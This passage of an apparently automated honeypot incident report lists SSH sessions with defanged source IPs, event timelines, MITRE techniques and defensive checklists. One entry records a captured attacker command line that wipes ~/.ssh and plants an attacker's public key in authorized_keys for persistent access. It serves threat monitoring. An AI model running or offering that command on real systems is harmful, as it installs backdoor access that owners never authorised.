| `2026-07-10 18:59:00` | `cowrie.login.success` |
| `2026-07-10 18:59:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd51e9c699a7

| Field | Detail |
|---|---|
| **Source IP** | `87.117.32[.]22` |
| **First Seen** | 2026-07-10 19:04 |
| **Last Seen** | 2026-07-10 19:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:04:23` | `cowrie.session.connect` |
| `2026-07-10 19:04:24` | `cowrie.client.version` |
| `2026-07-10 19:04:24` | `cowrie.client.kex` |
| `2026-07-10 19:04:24` | `cowrie.login.success` |
| `2026-07-10 19:04:25` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.117.32[.]22` to AbuseIPDB if not already reported
- [ ] Block `87.117.32[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bddcc11df5f

| Field | Detail |
|---|---|
| **Source IP** | `125.19.244[.]62` |
| **First Seen** | 2026-07-10 19:04 |
| **Last Seen** | 2026-07-10 19:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:04:30` | `cowrie.session.connect` |
| `2026-07-10 19:04:31` | `cowrie.client.version` |
| `2026-07-10 19:04:31` | `cowrie.client.kex` |
| `2026-07-10 19:04:33` | `cowrie.login.success` |
| `2026-07-10 19:04:34` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:04:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.19.244[.]62` to AbuseIPDB if not already reported
- [ ] Block `125.19.244[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe7b51898a1f

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]75` |
| **First Seen** | 2026-07-10 19:04 |
| **Last Seen** | 2026-07-10 19:09 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:04:31` | `cowrie.session.connect` |
| `2026-07-10 19:04:32` | `cowrie.client.version` |
| `2026-07-10 19:04:32` | `cowrie.client.kex` |
| `2026-07-10 19:04:33` | `cowrie.login.success` |
| `2026-07-10 19:04:34` | `cowrie.session.params` |
| `2026-07-10 19:04:34` | `cowrie.command.input` |
| `2026-07-10 19:04:34` | `cowrie.command.failed` |
| `2026-07-10 19:04:34` | `cowrie.log.closed` |
| `2026-07-10 19:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]75` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-177fc5589ee3

| Field | Detail |
|---|---|
| **Source IP** | `27.123.113[.]10` |
| **First Seen** | 2026-07-10 19:07 |
| **Last Seen** | 2026-07-10 19:08 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:07:41` | `cowrie.session.connect` |
| `2026-07-10 19:07:44` | `cowrie.client.version` |
| `2026-07-10 19:07:44` | `cowrie.client.kex` |
| `2026-07-10 19:07:53` | `cowrie.login.success` |
| `2026-07-10 19:07:57` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.123.113[.]10` to AbuseIPDB if not already reported
- [ ] Block `27.123.113[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f505364f0db7

| Field | Detail |
|---|---|
| **Source IP** | `103.250.160[.]76` |
| **First Seen** | 2026-07-10 19:08 |
| **Last Seen** | 2026-07-10 19:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:08:00` | `cowrie.session.connect` |
| `2026-07-10 19:08:01` | `cowrie.client.version` |
| `2026-07-10 19:08:01` | `cowrie.client.kex` |
| `2026-07-10 19:08:04` | `cowrie.login.success` |
| `2026-07-10 19:08:04` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:08:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.250.160[.]76` to AbuseIPDB if not already reported
- [ ] Block `103.250.160[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e55a93f6d553

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 19:10 |
| **Last Seen** | 2026-07-10 19:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:10:11` | `cowrie.session.connect` |
| `2026-07-10 19:10:12` | `cowrie.client.version` |
| `2026-07-10 19:10:12` | `cowrie.client.kex` |
| `2026-07-10 19:10:16` | `cowrie.login.success` |
| `2026-07-10 19:10:17` | `cowrie.session.params` |
| `2026-07-10 19:10:17` | `cowrie.command.input` |
| `2026-07-10 19:10:18` | `cowrie.log.closed` |
| `2026-07-10 19:10:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee575d6993aa

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 19:10 |
| **Last Seen** | 2026-07-10 19:10 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:10:35` | `cowrie.session.connect` |
| `2026-07-10 19:10:37` | `cowrie.client.version` |
| `2026-07-10 19:10:37` | `cowrie.client.kex` |
| `2026-07-10 19:10:45` | `cowrie.login.success` |
| `2026-07-10 19:10:49` | `cowrie.session.params` |
| `2026-07-10 19:10:49` | `cowrie.command.input` |
| `2026-07-10 19:10:50` | `cowrie.log.closed` |
| `2026-07-10 19:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a88a91b9ae2

| Field | Detail |
|---|---|
| **Source IP** | `58.56.128[.]190` |
| **First Seen** | 2026-07-10 19:12 |
| **Last Seen** | 2026-07-10 19:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:12:37` | `cowrie.session.connect` |
| `2026-07-10 19:12:38` | `cowrie.client.version` |
| `2026-07-10 19:12:38` | `cowrie.client.kex` |
| `2026-07-10 19:12:39` | `cowrie.login.success` |
| `2026-07-10 19:12:40` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:12:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.56.128[.]190` to AbuseIPDB if not already reported
- [ ] Block `58.56.128[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21c8ca4b4456

| Field | Detail |
|---|---|
| **Source IP** | `93.177.157[.]179` |
| **First Seen** | 2026-07-10 19:15 |
| **Last Seen** | 2026-07-10 19:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:15:56` | `cowrie.session.connect` |
| `2026-07-10 19:15:56` | `cowrie.client.version` |
| `2026-07-10 19:15:56` | `cowrie.client.kex` |
| `2026-07-10 19:15:57` | `cowrie.login.success` |
| `2026-07-10 19:15:58` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:16:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.177.157[.]179` to AbuseIPDB if not already reported
- [ ] Block `93.177.157[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a2aa65dd997

| Field | Detail |
|---|---|
| **Source IP** | `78.187.230[.]168` |
| **First Seen** | 2026-07-10 19:16 |
| **Last Seen** | 2026-07-10 19:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:16:07` | `cowrie.session.connect` |
| `2026-07-10 19:16:08` | `cowrie.client.version` |
| `2026-07-10 19:16:08` | `cowrie.client.kex` |
| `2026-07-10 19:16:09` | `cowrie.login.success` |
| `2026-07-10 19:16:09` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:16:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.230[.]168` to AbuseIPDB if not already reported
- [ ] Block `78.187.230[.]168` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5449fac5f139

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 19:24 |
| **Last Seen** | 2026-07-10 19:24 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:24:24` | `cowrie.session.connect` |
| `2026-07-10 19:24:26` | `cowrie.client.version` |
| `2026-07-10 19:24:26` | `cowrie.client.kex` |
| `2026-07-10 19:24:32` | `cowrie.login.success` |
| `2026-07-10 19:24:37` | `cowrie.session.params` |
| `2026-07-10 19:24:37` | `cowrie.command.input` |
| `2026-07-10 19:24:39` | `cowrie.log.closed` |
| `2026-07-10 19:24:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cb69df6c890

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 19:24 |
| **Last Seen** | 2026-07-10 19:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:24:56` | `cowrie.session.connect` |
| `2026-07-10 19:24:56` | `cowrie.client.version` |
| `2026-07-10 19:24:56` | `cowrie.client.kex` |
| `2026-07-10 19:24:56` | `cowrie.login.success` |
| `2026-07-10 19:24:57` | `cowrie.session.params` |
| `2026-07-10 19:24:57` | `cowrie.command.input` |
| `2026-07-10 19:24:57` | `cowrie.log.closed` |
| `2026-07-10 19:24:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bb46f581b55

| Field | Detail |
|---|---|
| **Source IP** | `59.8.50[.]83` |
| **First Seen** | 2026-07-10 19:26 |
| **Last Seen** | 2026-07-10 19:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:26:53` | `cowrie.session.connect` |
| `2026-07-10 19:26:54` | `cowrie.client.version` |
| `2026-07-10 19:26:54` | `cowrie.client.kex` |
| `2026-07-10 19:26:56` | `cowrie.login.success` |
| `2026-07-10 19:26:57` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:27:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.8.50[.]83` to AbuseIPDB if not already reported
- [ ] Block `59.8.50[.]83` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8e097e9bc73

| Field | Detail |
|---|---|
| **Source IP** | `213.101.138[.]172` |
| **First Seen** | 2026-07-10 19:27 |
| **Last Seen** | 2026-07-10 19:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:27:07` | `cowrie.session.connect` |
| `2026-07-10 19:27:07` | `cowrie.client.version` |
| `2026-07-10 19:27:07` | `cowrie.client.kex` |
| `2026-07-10 19:27:08` | `cowrie.login.success` |
| `2026-07-10 19:27:09` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.101.138[.]172` to AbuseIPDB if not already reported
- [ ] Block `213.101.138[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37c465d7387b

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]60` |
| **First Seen** | 2026-07-10 19:29 |
| **Last Seen** | 2026-07-10 19:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:29:37` | `cowrie.session.connect` |
| `2026-07-10 19:29:38` | `cowrie.client.version` |
| `2026-07-10 19:29:38` | `cowrie.client.kex` |
| `2026-07-10 19:29:39` | `cowrie.login.success` |
| `2026-07-10 19:29:40` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:29:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]60` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96f9c2d4afa9

| Field | Detail |
|---|---|
| **Source IP** | `220.124.221[.]144` |
| **First Seen** | 2026-07-10 19:30 |
| **Last Seen** | 2026-07-10 19:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:30:05` | `cowrie.session.connect` |
| `2026-07-10 19:30:06` | `cowrie.client.version` |
| `2026-07-10 19:30:06` | `cowrie.client.kex` |
| `2026-07-10 19:30:09` | `cowrie.login.success` |
| `2026-07-10 19:30:10` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.124.221[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.124.221[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2a08292ecb6

| Field | Detail |
|---|---|
| **Source IP** | `121.189.88[.]109` |
| **First Seen** | 2026-07-10 19:30 |
| **Last Seen** | 2026-07-10 19:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:30:16` | `cowrie.session.connect` |
| `2026-07-10 19:30:17` | `cowrie.client.version` |
| `2026-07-10 19:30:17` | `cowrie.client.kex` |
| `2026-07-10 19:30:20` | `cowrie.login.success` |
| `2026-07-10 19:30:21` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:30:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.88[.]109` to AbuseIPDB if not already reported
- [ ] Block `121.189.88[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf688e0547d4

| Field | Detail |
|---|---|
| **Source IP** | `118.26.153[.]102` |
| **First Seen** | 2026-07-10 19:33 |
| **Last Seen** | 2026-07-10 19:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:33:17` | `cowrie.session.connect` |
| `2026-07-10 19:33:18` | `cowrie.client.version` |
| `2026-07-10 19:33:18` | `cowrie.client.kex` |
| `2026-07-10 19:33:20` | `cowrie.login.success` |
| `2026-07-10 19:33:20` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:33:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.153[.]102` to AbuseIPDB if not already reported
- [ ] Block `118.26.153[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-445fe5ed4a88

| Field | Detail |
|---|---|
| **Source IP** | `159.65.2[.]17` |
| **First Seen** | 2026-07-10 19:35 |
| **Last Seen** | 2026-07-10 19:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:35:48` | `cowrie.session.connect` |
| `2026-07-10 19:35:48` | `cowrie.client.version` |
| `2026-07-10 19:35:48` | `cowrie.client.kex` |
| `2026-07-10 19:35:49` | `cowrie.login.success` |
| `2026-07-10 19:35:51` | `cowrie.session.params` |
| `2026-07-10 19:35:51` | `cowrie.command.input` |
| `2026-07-10 19:35:51` | `cowrie.command.failed` |
| `2026-07-10 19:35:51` | `cowrie.log.closed` |
| `2026-07-10 19:35:52` | `cowrie.session.params` |
| `2026-07-10 19:35:52` | `cowrie.command.input` |
| `2026-07-10 19:35:52` | `cowrie.session.file_download` |
| `2026-07-10 19:35:52` | `cowrie.log.closed` |
| `2026-07-10 19:35:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.65.2[.]17` to AbuseIPDB if not already reported
- [ ] Block `159.65.2[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e989dbbb33f4

| Field | Detail |
|---|---|
| **Source IP** | `159.65.2[.]17` |
| **First Seen** | 2026-07-10 19:35 |
| **Last Seen** | 2026-07-10 19:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:35:52` | `cowrie.session.connect` |
| `2026-07-10 19:35:52` | `cowrie.client.version` |
| `2026-07-10 19:35:53` | `cowrie.client.kex` |
| `2026-07-10 19:35:54` | `cowrie.login.success` |
| `2026-07-10 19:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.65.2[.]17` to AbuseIPDB if not already reported
- [ ] Block `159.65.2[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-512a3df03980

| Field | Detail |
|---|---|
| **Source IP** | `159.65.2[.]17` |
| **First Seen** | 2026-07-10 19:35 |
| **Last Seen** | 2026-07-10 19:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:35:54` | `cowrie.session.connect` |
| `2026-07-10 19:35:54` | `cowrie.client.version` |
| `2026-07-10 19:35:54` | `cowrie.client.kex` |
| `2026-07-10 19:35:55` | `cowrie.login.success` |
| `2026-07-10 19:35:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.65.2[.]17` to AbuseIPDB if not already reported
- [ ] Block `159.65.2[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7d5dcd5d1e8

| Field | Detail |
|---|---|
| **Source IP** | `83.239.108[.]218` |
| **First Seen** | 2026-07-10 19:37 |
| **Last Seen** | 2026-07-10 19:43 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:37:59` | `cowrie.session.connect` |
| `2026-07-10 19:37:59` | `cowrie.client.version` |
| `2026-07-10 19:37:59` | `cowrie.client.kex` |
| `2026-07-10 19:38:02` | `cowrie.login.success` |
| `2026-07-10 19:38:02` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:43:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.239.108[.]218` to AbuseIPDB if not already reported
- [ ] Block `83.239.108[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb4c5392c805

| Field | Detail |
|---|---|
| **Source IP** | `202.138.229[.]190` |
| **First Seen** | 2026-07-10 19:38 |
| **Last Seen** | 2026-07-10 19:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:38:12` | `cowrie.session.connect` |
| `2026-07-10 19:38:12` | `cowrie.client.version` |
| `2026-07-10 19:38:12` | `cowrie.client.kex` |
| `2026-07-10 19:38:14` | `cowrie.login.success` |
| `2026-07-10 19:38:15` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:38:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.138.229[.]190` to AbuseIPDB if not already reported
- [ ] Block `202.138.229[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f1fcccf9961

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 19:38 |
| **Last Seen** | 2026-07-10 19:38 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:38:17` | `cowrie.session.connect` |
| `2026-07-10 19:38:19` | `cowrie.client.version` |
| `2026-07-10 19:38:19` | `cowrie.client.kex` |
| `2026-07-10 19:38:27` | `cowrie.login.success` |
| `2026-07-10 19:38:32` | `cowrie.session.params` |
| `2026-07-10 19:38:32` | `cowrie.command.input` |
| `2026-07-10 19:38:34` | `cowrie.log.closed` |
| `2026-07-10 19:38:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cada0f7bdaff

| Field | Detail |
|---|---|
| **Source IP** | `45.145.203[.]68` |
| **First Seen** | 2026-07-10 19:39 |
| **Last Seen** | 2026-07-10 19:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:39:38` | `cowrie.session.connect` |
